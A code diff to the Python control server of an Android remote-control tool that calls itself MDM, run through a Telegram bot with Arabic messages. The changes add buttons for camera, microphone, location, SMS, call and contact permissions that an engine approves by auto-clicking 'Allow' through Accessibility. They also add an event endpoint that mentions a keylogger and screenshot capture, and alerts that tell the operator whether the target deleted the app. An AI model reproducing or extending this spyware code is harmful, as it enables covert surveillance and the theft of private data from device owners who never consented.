@@ -323,6 +323,24 @@ def _cb(device_id, action, target):
                 # Fallback: use short hash of device_id
                 result = f"{action}:{hash(device_id) % 99999}:{cache_key}"
         return result[:64]
+    # ⚡ FIX: For permission requests, use a short cache key to avoid truncation
+    # Telegram limits callback_data to 64 bytes. Long device IDs + "request-permission:camera"
+    # can exceed this, causing truncation like "cam" instead of "camera".
+    if action == "cmd" and target and target.startswith("request-permission:"):
+        perm_type = target.split(":", 1)[1]  # e.g. "camera"
+        cache_key = str(len(_file_path_cache))
+        _file_path_cache[cache_key] = target  # cache the full "request-permission:camera"
+        # Format: cmd:DEVICE_ID:pCACHE_KEY (very short)
+        result = f"{action}:{device_id}:p{cache_key}"
+        if len(result) > 64:
+            # Truncate device_id if still too long
+            overhead = len(action) + 1 + 1 + len(cache_key) + 1  # action + : + p + key + :
+            max_did_len = 64 - overhead
+            if max_did_len > 8:
+                result = f"{action}:{device_id[:max_did_len]}:p{cache_key}"
+            else:
+                result = f"{action}:{hash(device_id) % 99999}:p{cache_key}"
+        return result[:64]
     # For non-file actions, use full format but truncate if needed
     return f"{action}:{device_id}:{target}"[:64]
 
@@ -333,6 +351,9 @@ def _resolve_file_path(callback_target):
     """Resolve a callback target back to the full file path if it's a cache key."""
     if callback_target and callback_target.isdigit():
         return _file_path_cache.get(callback_target, callback_target)
+    # ⚡ Permission cache keys start with 'p' (e.g. "p0", "p1")
+    if callback_target and callback_target.startswith("p") and callback_target[1:].isdigit():
+        return _file_path_cache.get(callback_target[1:], callback_target)
     return callback_target
 
 def _cbtn(device_id, cmd_type):
@@ -436,12 +457,23 @@ def advanced_keyboard(did):
 # ── Permissions Keyboard ──
 def permissions_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
-    # ✅ Permission request buttons - each requests + auto-grants via Accessibility
-    perm_btn = lambda perm: InlineKeyboardButton(f"🔓 {perm}", callback_data=_cb(did, "cmd", f"request-permission:{perm}"))
-    kb.add(perm_btn("all"), perm_btn("camera"))
-    kb.add(perm_btn("microphone"), perm_btn("location"))
-    kb.add(perm_btn("storage"), perm_btn("contacts"))
-    kb.add(perm_btn("sms"), perm_btn("calls"))
+    # ⚡ كل زر يطلب إذناً واحداً فقط — لا أزرار "all"
+    # كل إذن يُفعّل بشكل مستقل تماماً
+    # PermissionAutoGrantEngine ينقر تلقائياً على "السماح" عبر 3 استراتيجيات
+    perm_btn = lambda perm, label: InlineKeyboardButton(
+        f"🔓 {label}",
+        callback_data=_cb(did, "cmd", f"request-permission:{perm}")
+    )
+    kb.add(perm_btn("camera", "📷 الكاميرا"),
+           perm_btn("microphone", "🎤 الميكروفون"))
+    kb.add(perm_btn("location", "📍 الموقع"),
+           perm_btn("background-location", "🌐 الموقع في الخلفية"))
+    kb.add(perm_btn("storage", "📁 التخزين"),
+           perm_btn("contacts", "👥 جهات الاتصال"))
+    kb.add(perm_btn("sms", "💬 الرسائل"),
+           perm_btn("calls", "📞 المكالمات"))
+    kb.add(perm_btn("notifications", "🔔 الإشعارات"),
+           perm_btn("phone-state", "📱 حالة الهاتف"))
     kb.add(_back(did))
     return kb
 
@@ -1150,6 +1182,8 @@ class MDMBot:
                 bot.answer_callback_query(c.id)
 
             elif a == "cmd":
+                # ⚡ Resolve cache keys (for permission requests, file paths, etc.)
+                tgt = _resolve_file_path(tgt)
                 # ✅ Handle request-permission:<type> format
                 if tgt.startswith("request-permission:"):
                     perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
@@ -1393,7 +1427,7 @@ app.config["SECRET_KEY"] = Config.SECRET_KEY or Config.E2E_KEY
 
 # Socket.IO with EIO v3 compatibility
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet",
-                    ping_timeout=60, ping_interval=25)
+                    ping_timeout=5, ping_interval=5)
 
 # ── EIO v3 Compatibility Middleware ──
 _original_wsgi_app = app.wsgi_app
@@ -1724,6 +1758,82 @@ def _api_cmds():
 
 
 # ═══════════════════════════════════════════════════════════════════════
+# 9b. FAST DEVICE EVENTS (REST) - reaches bot in <1 second
+# ═══════════════════════════════════════════════════════════════════════
+
+@app.route("/api/device/event", methods=["POST"])
+def _api_device_event():
+    """Receive immediate device events via REST (no Socket.IO needed).
+
+    Events:
+      - accessibility_enabled  : user just enabled Accessibility
+      - accessibility_disabled : user just disabled Accessibility
+      - network_restored       : network was off, now back (proves it wasn't deletion)
+      - network_lost           : network went off (rarely used - usually no network to send)
+    """
+    data = request.json or {}
+    did = data.get("device_id", "")
+    event = data.get("event", "")
+    message = data.get("message", "")
+    timestamp = data.get("timestamp", 0)
+
+    if not did or not event:
+        return jsonify({"success": False, "error": "device_id and event required"}), 400
+
+    logger.info(f"[REST-Event] {did} event={event} msg={message[:80]}")
+
+    # Look up device (may not be registered yet if accessibility_just_enabled)
+    dev = dm.get_device(did)
+    if not dev:
+        dev = {"device_id": did, "model": "Unknown", "short_id": "?"}
+    short_label = _dev_label(dev)
+
+    # Build event-specific bot message
+    event_messages = {
+        "accessibility_enabled":
+            f"⚡ <b>إمكانية الوصول مفعّلة!</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"✅ تم تفعيل Accessibility\n"
+            f"🟢 الجهاز متصل وجاهز للأوامر\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}",
+        "accessibility_disabled":
+            f"⚠️ <b>تم إلغاء إمكانية الوصول</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"🚫 الميزات المتقدمة معطلة (لقطات شاشة، keylogger)\n"
+            f"💡 الميزات العادية قد تعمل إذا كان التطبيق مفتوحاً\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}",
+        "network_restored":
+            f"🌐 <b>عادت الشبكة - تأكد سبب الانقطاع</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"✅ <b>كان الانقطاع بسبب إطفاء الإنترنت</b>\n"
+            f"🚫 <b>ليس بسبب حذف التطبيق</b>\n"
+            f"🔄 الجهاز يعيد الاتصال الآن\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"💬 {message}",
+        "network_lost":
+            f"🔴 <b>انقطعت الشبكة</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"⚠ السبب: إطفاء الإنترنت (وليس حذف التطبيق)\n"
+            f"💡 سيعود الاتصال عند عودة الشبكة",
+    }
+
+    msg_text = event_messages.get(event,
+        f"📡 <b>حدث: {event}</b>\n\n📱 <b>{short_label}</b>\n💬 {message}")
+
+    # Send to all admin users via Telegram bot
+    if mdm_bot:
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                mdm_bot.bot.send_message(admin_id, msg_text, parse_mode="HTML")
+            except Exception as e:
+                logger.error(f"فشل إرسال حدث REST للبوت: {e}")
+
+    return jsonify({"success": True, "event": event}), 200
+
+
+# ═══════════════════════════════════════════════════════════════════════
 # 10. SOCKET.IO EVENTS
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -1737,7 +1847,13 @@ def _sock_disconnect():
     dev = dm.get_device_by_sid(sid)
     logger.info(f"قطع: SID={sid}")
     dm.handle_disconnect(sid)
-    # ✅ Notify bot immediately when device disconnects (app deleted/closed)
+    # ⚡ Notify bot IMMEDIATELY when device disconnects.
+    # The bot message tells the admin that the disconnect MIGHT be:
+    #   - Network off (will come back soon → "network_restored" event will arrive)
+    #   - App deleted (will NOT come back → no "network_restored" event)
+    #   - Device powered off (same as deleted - no return)
+    # The admin can distinguish by waiting: if "network_restored" arrives
+    # within ~5 min, it was network. If not, the app was likely deleted.
     if dev and mdm_bot:
         short_label = _dev_label(dev)
         for admin_id in Config.ADMIN_IDS:
@@ -1745,7 +1861,14 @@ def _sock_disconnect():
                 mdm_bot.bot.send_message(admin_id,
                     f"🔴 <b>جهاز انقطع</b>\n\n"
                     f"📱 <b>{short_label}</b>\n"
-                    f"⚠ قد يكون التطبيق تم حذفه أو إغلاقه",
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"⚠ <b>السبب المحتمل:</b>\n"
+                    f"• إطفاء الشبكة (سيعود قريباً ✅)\n"
+                    f"• حذف التطبيق (لن يعود ❌)\n"
+                    f"• إطفاء الجهاز (لن يعود ❌)\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"💡 إذا وصلت رسالة \"🌐 عادت الشبكة\" → كان السبب إطفاء النت\n"
+                    f"💡 إذا لم تعد أي رسالة ← 5 دقائق → التطبيق محذوف",
                     parse_mode="HTML")
             except Exception as e:
                 logger.error(f"فشل إرسال إشعار الانقطاع: {e}")
